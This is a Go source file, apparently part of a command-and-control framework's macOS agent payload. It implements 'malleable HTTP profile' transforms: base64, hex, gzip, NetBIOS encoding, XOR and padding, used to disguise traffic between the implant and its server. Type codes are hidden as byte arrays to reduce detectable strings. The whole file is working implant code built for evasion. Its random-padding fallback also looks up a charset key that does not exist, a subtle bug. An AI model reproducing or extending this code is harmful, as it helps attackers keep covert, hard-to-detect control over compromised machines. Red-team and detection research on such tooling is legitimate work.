// server/docker/payloads/Darwin/transforms.go
// Agent-side transforms for malleable HTTP profiles

//go:build darwin
// +build darwin

package main

import (
	"bytes"
	"compress/gzip"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"strings"
)

// Transform type codes (single char to reduce binary strings)
var (
	tBase64    = string([]byte{0x61}) // a
	tBase64URL = string([]byte{0x62}) // b
	tHex       = string([]byte{0x63}) // c
	tGzip      = string([]byte{0x64}) // d
	tNetBIOS   = string([]byte{0x65}) // e
	tXOR       = string([]byte{0x66}) // f
	tPrepend   = string([]byte{0x67}) // g
	tAppend    = string([]byte{0x68}) // h
	tRandPre   = string([]byte{0x69}) // i
	tRandApp   = string([]byte{0x6a}) // j
)

// Charset codes
var (
	cNum   = string([]byte{0x31}) // 1
	cAlpha = string([]byte{0x32}) // 2
	cAlnum = string([]byte{0x33}) // 3
	cHex   = string([]byte{0x34}) // 4
)

// Transform represents a single transformation step
type Transform struct {
	Type    string `json:"T"`
	Value   string `json:"V,omitempty"`
	Length  int    `json:"L,omitempty"`
	Charset string `json:"C,omitempty"`
}

// DataBlock defines how data is transformed and placed
type DataBlock struct {
	Output     string      `json:"o"`
	Transforms []Transform `json:"t,omitempty"`
}

// TransformResult contains the result and metadata
type TransformResult struct {
	Data          []byte
	PrependLength int
	AppendLength  int
}

// Character sets for random generation (mapped by code)
var charsets = map[string]string{
	cNum:   "0123456789",
	cAlpha: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
	cAlnum: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
	cHex:   "0123456789abcdef",
}

// =============================================================================
// FORWARD TRANSFORMS (Agent -> Server)
// =============================================================================

// applyTransforms applies a chain of transforms in order
func applyTransforms(data []byte, transforms []Transform) (*TransformResult, error) {
	result := &TransformResult{Data: data}

	for _, t := range transforms {
		var err error
		switch t.Type {
		case tBase64:
			result.Data = encodeBase64(result.Data)
		case tBase64URL:
			result.Data = encodeBase64URL(result.Data)
		case tHex:
			result.Data = encodeHex(result.Data)
		case tGzip:
			result.Data, err = encodeGzip(result.Data)
		case tNetBIOS:
			result.Data = encodeNetBIOS(result.Data)
		case tXOR:
			result.Data = applyXOR(result.Data, []byte(t.Value))
		case tPrepend:
			result.Data = prependBytes(result.Data, []byte(t.Value))
		case tAppend:
			result.Data = appendBytes(result.Data, []byte(t.Value))
		case tRandPre:
			padding := generateRandom(t.Length, t.Charset)
			result.Data = prependBytes(result.Data, padding)
			result.PrependLength = t.Length
		case tRandApp:
			padding := generateRandom(t.Length, t.Charset)
			result.Data = appendBytes(result.Data, padding)
			result.AppendLength = t.Length
		default:
			return nil, fmt.Errorf(Err(E18))
		}
		if err != nil {
			return nil, err
		}
	}

	return result, nil
}

// =============================================================================
// REVERSE TRANSFORMS (for parsing server responses)
// =============================================================================

// reverseTransforms reverses transforms to extract original data
func reverseTransforms(data []byte, transforms []Transform, prependLen, appendLen int) ([]byte, error) {
	result := data

	// Apply in reverse order
	for i := len(transforms) - 1; i >= 0; i-- {
		t := transforms[i]
		var err error

		switch t.Type {
		case tBase64:
			result, err = decodeBase64(result)
		case tBase64URL:
			result, err = decodeBase64URL(result)
		case tHex:
			result, err = decodeHex(result)
		case tGzip:
			result, err = decodeGzip(result)
		case tNetBIOS:
			result, err = decodeNetBIOS(result)
		case tXOR:
			result = applyXOR(result, []byte(t.Value))
		case tPrepend:
			result = stripPrepend(result, len(t.Value))
		case tAppend:
			result = stripAppend(result, len(t.Value))
		case tRandPre:
			length := prependLen
			if length == 0 {
				length = t.Length
			}
			result = stripPrepend(result, length)
		case tRandApp:
			length := appendLen
			if length == 0 {
				length = t.Length
			}
			result = stripAppend(result, length)
		default:
			return nil, fmt.Errorf(Err(E18))
		}

		if err != nil {
			return nil, err
		}
	}

	return result, nil
}

// =============================================================================
// ENCODING FUNCTIONS
// =============================================================================

func encodeBase64(data []byte) []byte {
	return []byte(base64.StdEncoding.EncodeToString(data))
}

func decodeBase64(data []byte) ([]byte, error) {
	return base64.StdEncoding.DecodeString(string(data))
}

func encodeBase64URL(data []byte) []byte {
	return []byte(base64.URLEncoding.EncodeToString(data))
}

func decodeBase64URL(data []byte) ([]byte, error) {
	return base64.URLEncoding.DecodeString(string(data))
}

func encodeHex(data []byte) []byte {
	return []byte(hex.EncodeToString(data))
}

func decodeHex(data []byte) ([]byte, error) {
	return hex.DecodeString(string(data))
}

func encodeGzip(data []byte) ([]byte, error) {
	var buf bytes.Buffer
	w := gzip.NewWriter(&buf)
	if _, err := w.Write(data); err != nil {
		return nil, err
	}
	if err := w.Close(); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

func decodeGzip(data []byte) ([]byte, error) {
	r, err := gzip.NewReader(bytes.NewReader(data))
	if err != nil {
		return nil, err
	}
	defer r.Close()
	return io.ReadAll(r)
}

// NetBIOS encoding: each byte becomes two characters (nibble encoding)
func encodeNetBIOS(data []byte) []byte {
	result := make([]byte, len(data)*2)
	for i, b := range data {
		result[i*2] = 'a' + (b >> 4)
		result[i*2+1] = 'a' + (b & 0x0f)
	}
	return result
}

func decodeNetBIOS(data []byte) ([]byte, error) {
	if len(data)%2 != 0 {
		return nil, fmt.Errorf(Err(E18))
	}
	result := make([]byte, len(data)/2)
	for i := 0; i < len(data); i += 2 {
		high := data[i] - 'a'
		low := data[i+1] - 'a'
		if high > 15 || low > 15 {
			return nil, fmt.Errorf(Err(E18))
		}
		result[i/2] = (high << 4) | low
	}
	return result, nil
}

// =============================================================================
// XOR FUNCTION
// =============================================================================

func applyXOR(data []byte, key []byte) []byte {
	if len(key) == 0 {
		return data
	}
	result := make([]byte, len(data))
	for i, b := range data {
		result[i] = b ^ key[i%len(key)]
	}
	return result
}

// =============================================================================
// PADDING FUNCTIONS
// =============================================================================

func prependBytes(data []byte, prefix []byte) []byte {
	result := make([]byte, len(prefix)+len(data))
	copy(result, prefix)
	copy(result[len(prefix):], data)
	return result
}

func appendBytes(data []byte, suffix []byte) []byte {
	result := make([]byte, len(data)+len(suffix))
	copy(result, data)
	copy(result[len(data):], suffix)
	return result
}

func stripPrepend(data []byte, length int) []byte {
	if length >= len(data) {
		return []byte{}
	}
	return data[length:]
}

func stripAppend(data []byte, length int) []byte {
	if length >= len(data) {
		return []byte{}
	}
	return data[:len(data)-length]
}

func generateRandom(length int, charset string) []byte {
	if length <= 0 {
		return []byte{}
	}

	chars := charsets[charset]
	if chars == "" {
		chars = charsets["alphanumeric"]
	}

	result := make([]byte, length)
	randomBytes := make([]byte, length)
	rand.Read(randomBytes)

	for i := 0; i < length; i++ {
		result[i] = chars[int(randomBytes[i])%len(chars)]
	}
	return result
}

// =============================================================================
// HELPER FUNCTIONS
// =============================================================================

// parseOutput parses output location like "header:X-ID" or "body"
func parseOutput(output string) (locationType, name string) {
	parts := strings.SplitN(output, ":", 2)
	if len(parts) == 1 {
		return parts[0], ""
	}
	return parts[0], parts[1]
}

// parseDataBlock parses a JSON-encoded DataBlock
func parseDataBlock(jsonData string) *DataBlock {
	if jsonData == "" {
		return nil
	}

	var db DataBlock
	if err := json.Unmarshal([]byte(jsonData), &db); err != nil {
		return nil
	}
	return &db
}
